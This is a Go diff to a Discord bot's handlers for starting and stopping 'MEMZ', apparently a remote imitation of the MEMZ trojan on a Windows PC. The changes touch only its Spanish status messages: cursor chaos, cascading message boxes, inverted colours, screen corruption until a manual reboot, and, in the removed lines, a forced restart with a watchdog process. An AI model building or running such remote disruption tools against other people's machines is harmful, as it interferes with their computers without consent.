@@ -19,8 +19,7 @@ func MemzStart(s *discordgo.Session, i *discordgo.InteractionCreate) {
 	opts := win32.MemzDefaults()
 
 	_, _ = s.FollowupMessageCreate(i.Interaction, true, &discordgo.WebhookParams{
-		Content: fmt.Sprintf("💀 **MEMZ iniciado**\nGuion: cursor → URLs → inversión → beeps → tiles → lluvia → notepad → Nyan Cat\nMemoria máxima: %d MB · duración: %d s · reinicio en %d s",
-			opts.MemoryCapMB, int(opts.Duration.Seconds()), int(opts.RestartDelay.Seconds())),
+		Content: "💀 **MEMZ en marcha**\nFase 1: cursor por toda la pantalla\nFase 2: mensajes en árabe en cascada\nFase 3: colores invertidos y aleatorios\nFase 4: corrupción gráfica que se queda hasta que reinicies la PC a mano\n\nLa pantalla no vuelve sola: usa **Detener MEMZ** desde aquí o reinicia el equipo.",
 	})
 
 	go func() {
@@ -39,13 +38,13 @@ func MemzAbort(s *discordgo.Session, i *discordgo.InteractionCreate) {
 		return
 	}
 
-	if err := win32.AbortMemzRestart(); err != nil {
-		content := "⚠️ **No se pudo abortar el reinicio**\n```\n" + err.Error() + "\n```"
+	if err := win32.StopMemz(); err != nil {
+		content := "⚠️ **No se pudo detener MEMZ**\n```\n" + err.Error() + "\n```"
 		_, _ = s.InteractionResponseEdit(i.Interaction, &discordgo.WebhookEdit{Content: &content})
 		return
 	}
 
-	content := "🛑 **Reinicio abortado**\nLa simulación terminó y la PC sigue encendida. Nada quedó modificado."
+	content := "🛑 **MEMZ detenido**\nPantalla, cursor y mensajes vuelven a la normalidad. Nada quedó en disco."
 	_, _ = s.InteractionResponseEdit(i.Interaction, &discordgo.WebhookEdit{Content: &content})
 }
 
@@ -55,32 +54,18 @@ func memzResultView(report win32.MemzReport) string {
 	if report.Err != "" {
 		out.WriteString("⚠️ **MEMZ terminó con avisos**\n\n")
 	} else {
-		out.WriteString("💀 **MEMZ — simulación terminada**\n\n")
+		out.WriteString("💀 **MEMZ detenido**\n\n")
 	}
 
-	fmt.Fprintf(&out, "• Etapas: **%s**\n", strings.Join(report.Stages, " → "))
-	fmt.Fprintf(&out, "• Memoria retenida: **%d MB**\n", report.PeakMB)
-	fmt.Fprintf(&out, "• Duración: **%d ms**\n", report.Duration.Milliseconds())
+	fmt.Fprintf(&out, "• Fases: **%s**\n", strings.Join(report.Phases, " → "))
+	fmt.Fprintf(&out, "• Mensajes creados: **%d**\n", report.Boxes)
+	fmt.Fprintf(&out, "• Duración: **%d s**\n", int(report.Duration.Seconds()))
 
-	if report.RestartScheduled {
-		if report.CountdownS > 0 {
-			fmt.Fprintf(&out, "• Reinicio: **en %d s**\n", report.CountdownS)
-		} else {
-			out.WriteString("• Reinicio: **programado**\n")
-		}
-	} else if report.Err == "" {
-		out.WriteString("• Reinicio: **no programado**\n")
-	}
-
-	if report.WatchdogPID > 0 {
-		fmt.Fprintf(&out, "• Vigilante: **PID %d**\n", report.WatchdogPID)
-	}
 	if report.Err != "" {
 		fmt.Fprintf(&out, "• Error: `%s`\n", report.Err)
 	}
 
-	out.WriteString("\nLa PC se reinicia y todo vuelve a la normalidad.\n")
-	out.WriteString("Puedes cancelar con **Abortar reinicio**.\n")
+	out.WriteString("\nLa pantalla queda restaurada. Si vuelve a activarse, reinicia la PC: no hay nada persistente.\n")
 
 	return out.String()
 }
